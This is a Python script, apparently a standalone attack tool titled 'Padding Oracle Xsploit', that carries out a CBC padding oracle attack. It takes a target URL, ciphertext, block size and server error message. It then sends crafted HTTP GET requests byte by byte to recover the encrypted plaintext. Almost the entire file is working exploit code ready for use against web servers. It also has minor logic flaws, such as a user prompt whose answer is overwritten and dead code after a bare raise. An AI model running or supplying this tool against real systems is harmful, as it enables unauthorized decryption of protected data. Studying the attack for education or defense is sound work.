import requests as req
import string
import binascii
import itertools
import sys
from termcolor import colored
import colorama
import codecs

colorama.init()
def mapping(x):
    if len(x) == 1:
        return f"0{x}"
    else:
        return x

fa = "\x01\x03\x02\x04\x05\x06\x07\x08" + string.digits + string.ascii_letters
fa = list(fa)
for i,l in enumerate(fa):
  fa[i] = hex(ord(l))[2:]
fa = list(map(mapping,fa))


ar = [chr(c) for c in range(256)]

for i,l in enumerate(ar):
  ar[i] = hex(ord(l))[2:]
ar = list(map(mapping,ar))

for a,aa in enumerate(ar):
  if aa in fa:
    del ar[a]

iter_str = list(itertools.product('0123456789ABCDEF', repeat=2))
del iter_str[0]



url  = str(input("Url  :"))
hexa = str(input("Hex :"))
block_size = int(input("Block size : "))
error_msg = str(input("Error message :"))
f_b = str(input("Do you want to decode the first block ? [y/n] :") or "y")
f_b = "n"
if f_b != "y" or f_b != "n":
  f_b = "n"
sort_hexa = [hexa[i:i+int(block_size *2)] for i in range(0,len(hexa),block_size *2)]

print('Padding Oracle Xsploit by realbacon\n')
print(colored(f"- Version 1.0\n- Target : {url}\n- Sample hex : {hexa}\n- Block lenght : {block_size}\n- Encode first block : {f_b}\n",'yellow'))

def decrypt(previous,block_to_decrypt):
  re = []
  cut_block = []
  ref_block = [previous[i:i+2] for i in range(0,len(previous),2)]
  inter_value = ["00" for i in range(0,int(block_size))]
  for i in range(0,len(block_to_decrypt),2):
    cut_block.append(block_to_decrypt[i:i+2])
  for i,a in enumerate(reversed(inter_value)):
    flag = False
    print(colored(f"[*] Searching byte {16-i}",'magenta'))
    send = inter_value.copy()
    send_encoded = inter_value.copy()

    for j in fa:
      index = -i-1
      send[index],send_encoded[index] = hex(int(j,16) ^ int(ref_block[index],16))[2:], hex(int(j,16) ^ int(ref_block[index],16))[2:]
      for k,kk in enumerate(send):
        send_encoded[k] = hex(int(kk,16) ^ int("".join(iter_str[i]),16))[2:] if kk != "00" else "00"
      send = list(map(mapping,send))
      send_encoded = list(map(mapping,send_encoded))
      u = url + "".join(send_encoded) + block_to_decrypt
      r = req.get(u)

      if error_msg not in r.text:
        flag = True
        break

    if flag == False:
      print(colored("[*] Char not in fast list, switching to long list",'magenta'))
      for j in ar:
        index = -i-1
        send[index],send_encoded[index] = hex(int(j,16) ^ int(ref_block[index],16))[2:], hex(int(j,16) ^ int(ref_block[index],16))[2:]
        send = list(map(mapping,send))
        send_encoded = list(map(mapping,send_encoded))
        for k,kk in enumerate(send):
          send_encoded[k] = hex(int(kk,16) ^ int("".join(iter_str[i]),16))[2:] if kk != "00" else "00"
        send = list(map(mapping,send))
        send_encoded = list(map(mapping,send_encoded))
        u = url + "".join(send_encoded) + block_to_decrypt
        r = req.get(u)

        if error_msg not in r.text:
          flag = True
          break
    if flag == True:
      print(colored(f"[+] Found : {''.join(send_encoded)}","cyan"))
      p =  bytes.fromhex(j)
      try:
        p = str(p.decode('utf-8'))
        print(colored("              - Encoding : utf-8","white"),end="\r")
      except:
        raise
        p = str(p)
        print(colored("                     - Can' decode, probably not utf-8 : ","red"),end="\r")
        pass
      print(colored(f"[+] Char : {p}\n","cyan"))
      re.insert(0,p)
      cut_block.append(hex(int(j,16) ^ int(ref_block[index],16))[2:])
      inter_value[index] = send[index]
    else:
      print(colored("[-] Char not found, check your flags...",'red'))
      return 0

  print("[+] Decoded value :","".join(re),"\n")
  return "".join(re)


comp_arr = sort_hexa.copy()
comp_arr.insert(0,comp_arr[0])
start = 2 if f_b == "n" else 1
final_res = []
for i in range(start,len(sort_hexa)+1):
  a=i-1
  print("[*] Switching to block",i,'\n')
  final_res.append(decrypt(comp_arr[a],comp_arr[i]))

print(colored(f"Decoded block : {''.join(final_res)}",'green'))
